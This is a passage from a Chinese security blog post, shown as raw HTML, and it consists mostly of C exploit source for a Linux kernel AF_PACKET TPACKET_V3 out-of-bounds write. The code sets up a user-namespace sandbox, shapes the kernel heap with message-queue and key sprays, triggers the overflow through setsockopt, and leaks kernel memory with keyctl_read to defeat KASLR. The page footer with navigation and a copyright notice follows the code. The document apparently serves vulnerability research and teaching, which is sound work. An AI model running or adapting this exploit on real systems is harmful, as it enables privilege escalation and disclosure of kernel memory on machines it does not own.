j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \\n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	<span class="comment">// specify using TPACKET_V3 version cause this vulnerability</span></span><br><span class="line">	<span class="comment">// only impacts this verison</span></span><br><span class="line">	<span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">	<span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">	req.tp_block_size = block_size; <span class="comment">// 0x1000</span></span><br><span class="line">	req.tp_frame_size = frame_size;	<span class="comment">// 0x1000</span></span><br><span class="line">	req.tp_block_nr = block_nr; <span class="comment">// 0x1</span></span><br><span class="line">	req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">	req.tp_retire_blk_tov = timeout;</span><br><span class="line">	<span class="comment">// (1u&lt;&lt;31) + (1u&lt;&lt;30) + 0x8000 - BLK_HDR_LEN - macoff + offset</span></span><br><span class="line">	req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">	req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// vulnerability happens in this system call</span></span><br><span class="line">	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	<span class="comment">// create a AF_PACKET socket</span></span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">	<span class="keyword">if</span> (s &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">		sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_family = PF_PACKET;</span><br><span class="line">	sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] bind(AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_send</span><span class="params">(<span class="type">int</span> s, <span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_halen = ETH_ALEN;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sendto(s, buffer, size, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;sa,</span><br><span class="line">			<span class="keyword">sizeof</span>(sa)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] sendto(SOCK_RAW)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loopback_send</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(SOCK_RAW)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	packet_socket_send(s, buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_sock_kmalloc</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(SOCK_DGRAM)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_timer_schedule</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	packet_socket_rx_ring_init(s, <span class="number">0x1000</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">0</span>, timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_id_match_trigger</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">	packet_socket_send(s, &amp;buffer[<span class="number">0</span>], <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(x, a)			__ALIGN_KERNEL((x), (a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) &amp; ~(mask))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V3_ALIGNMENT	(8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_HDR_LEN	sizeof(struct ethhdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_HDR_LEN	sizeof(struct iphdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN	sizeof(struct udphdr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN_FULL	(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">oob_setup</span><span class="params">(<span class="type">int</span> offset)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> maclen = ETH_HDR_LEN;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +</span><br><span class="line">				(maclen &lt; <span class="number">16</span> ? <span class="number">16</span> : maclen));</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> macoff = netoff - maclen;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> sizeof_priv = (<span class="number">1u</span>&lt;&lt;<span class="number">31</span>) + (<span class="number">1u</span>&lt;&lt;<span class="number">30</span>) +</span><br><span class="line">		<span class="number">0x8000</span> - BLK_HDR_LEN - macoff + offset;</span><br><span class="line">	<span class="keyword">return</span> packet_socket_setup(<span class="number">0x8000</span>, <span class="number">2048</span>, <span class="number">2</span>, sizeof_priv, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">oob_setup_kaslr</span><span class="params">(<span class="type">int</span> offset)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> maclen = ETH_HDR_LEN;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +</span><br><span class="line">				(maclen &lt; <span class="number">16</span> ? <span class="number">16</span> : maclen));</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> macoff = netoff - maclen;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> sizeof_priv = (<span class="number">1u</span>&lt;&lt;<span class="number">31</span>) + (<span class="number">1u</span>&lt;&lt;<span class="number">30</span>) +</span><br><span class="line">		<span class="number">0x1000</span> - BLK_HDR_LEN - macoff + offset;</span><br><span class="line">	<span class="keyword">return</span> packet_socket_setup(<span class="number">0x1000</span>, <span class="number">0x200</span>, <span class="number">2</span>, sizeof_priv, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	loopback_send(buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kmalloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">		packet_sock_kmalloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">	packet_socket_setup(<span class="number">0x8000</span>, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagealloc_pad_kaslr</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">    <span class="comment">// kmalloc-256 uses 1 page slab</span></span><br><span class="line">	packet_socket_setup(<span class="number">0x1000</span>, <span class="number">0x200</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">write_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* what, ...)</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	va_list args;</span><br><span class="line">	va_start(args, what);</span><br><span class="line">	vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">	va_end(args);</span><br><span class="line">	buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_sandbox</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> real_uid = getuid();</span><br><span class="line">	<span class="type">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_uid))&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">cpu_set_t</span> my_set;</span><br><span class="line">	CPU_ZERO(&amp;my_set);</span><br><span class="line">	CPU_SET(<span class="number">0</span>, &amp;my_set);</span><br><span class="line">	<span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(my_set), &amp;my_set) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] sched_setaffinity()&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (system(<span class="string">&quot;/sbin/ifconfig lo up&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] system(/sbin/ifconfig lo up)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************ KASLR BYPASS ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* spray 256 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">msg_init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msqid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 200 for 256</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">msg_alloc</span><span class="params">(<span class="type">int</span> msqid, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg</span> *<span class="title">m</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg) + size);</span><br><span class="line">    m-&gt;mtype = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(m-&gt;data, <span class="number">0x41</span>, size);</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msqid, (<span class="type">void</span> *)m, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg)+size, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kmalloc_msg</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">    <span class="type">int</span> msqid;</span><br><span class="line">    msqid = msg_init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;num; i++) &#123;</span><br><span class="line">        <span class="comment">// kmalloc 256</span></span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">50</span> == <span class="number">0</span>)</span><br><span class="line">            msqid = msg_init();</span><br><span class="line">        msg_alloc(msqid, <span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">key_serial_t</span> <span class="title function_">spray_key</span><span class="params">(<span class="type">size_t</span> size, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">0x18</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;size &lt;= 0x18\\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> type[<span class="number">5</span>] = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">	<span class="type">char</span>* description = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);</span><br><span class="line">	<span class="type">char</span>* payload = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size<span class="number">-0x18</span>); <span class="comment">// 256</span></span><br><span class="line">	<span class="built_in">memset</span>(payload, <span class="string">&#x27;B&#x27;</span>, size<span class="number">-0x18</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">key_serial_t</span> key;</span><br><span class="line">	<span class="built_in">sprintf</span>(description, <span class="string">&quot;key%d&quot;</span>, i);</span><br><span class="line">	key = add_key(type, description, payload, size<span class="number">-0x18</span>, KEY_SPEC_USER_KEYRING);</span><br><span class="line">	<span class="keyword">if</span> (key == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="built_in">free</span>(description);</span><br><span class="line">    <span class="built_in">free</span>(payload);</span><br><span class="line">	<span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">leak_key</span><span class="params">(<span class="type">key_serial_t</span> key, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">	<span class="type">void</span> *data = <span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="built_in">memset</span>(data, <span class="number">0</span>, size);</span><br><span class="line">    <span class="type">int</span> xxx = keyctl_read(key, data, size);</span><br><span class="line">	<span class="keyword">if</span> (xxx == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;keyctl_read&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (xxx == <span class="number">0x4444</span>) &#123;</span><br><span class="line">		<span class="built_in">free</span>(data);</span><br><span class="line">		data = <span class="built_in">malloc</span>(<span class="number">0x4444</span>);</span><br><span class="line">		<span class="comment">// leaking `struct key`</span></span><br><span class="line">		keyctl_read(key, data, <span class="number">0x4444</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read key: %d\\n&quot;</span>, xxx);</span><br><span class="line">	<span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">key_serial_t</span> keys[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_user_key</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = oob_setup_kaslr(<span class="number">0x2000</span>+<span class="number">0x2e8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        keys[i] = spray_key(<span class="number">256</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer+<span class="number">0x18</span><span class="number">-2</span>+<span class="number">0x10</span>, <span class="string">&#x27;D&#x27;</span>, <span class="number">0x110</span>);</span><br><span class="line">	buffer[<span class="number">0x26</span>] = <span class="number">0x0</span>;</span><br><span class="line">	buffer[<span class="number">0x27</span>] = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prb_open_block</span></span><br><span class="line">    oob_write(buffer, <span class="number">0x40</span>);</span><br><span class="line">    <span class="type">int</span> target = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        <span class="type">char</span> *data = leak_key(keys[i], <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">0x500</span><span class="number">-0x10</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(data+j+<span class="number">0x10</span>, <span class="string">&quot;DDBBBBBBBBBBBBBB&quot;</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">                DumpHex(data, <span class="number">0x500</span>);</span><br><span class="line">                target = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;We find it!\\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> found;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       	<span class="built_in">printf</span>(<span class="string">&quot;%d\\n&quot;</span>, i);</span><br><span class="line">       	DumpHex(data, <span class="number">100</span>);</span><br><span class="line">		<span class="built_in">free</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Not found\\n&quot;</span>);</span><br><span class="line">	<span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">    DumpHex(leak_key(keys[target], <span class="number">0x2000</span>), <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] starting\\n&quot;</span>);</span><br><span class="line">	setup_sandbox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] namespace sandbox set up\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] padding heap\\n&quot;</span>);</span><br><span class="line">    kmalloc_msg(<span class="number">0x800</span>);</span><br><span class="line">    pagealloc_pad_kaslr(<span class="number">0x500</span>);</span><br><span class="line">    oob_user_key();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/2291042632.html">https://www.lyyl.online/posts/2291042632.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-67.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/3147857986.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-62.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Tcache Stashing Unlink Attack 利用</div></div></a></div><div class="next-post pull-right"><a href="/posts/3705072996.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2021 XCTF Final 线下WP</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item 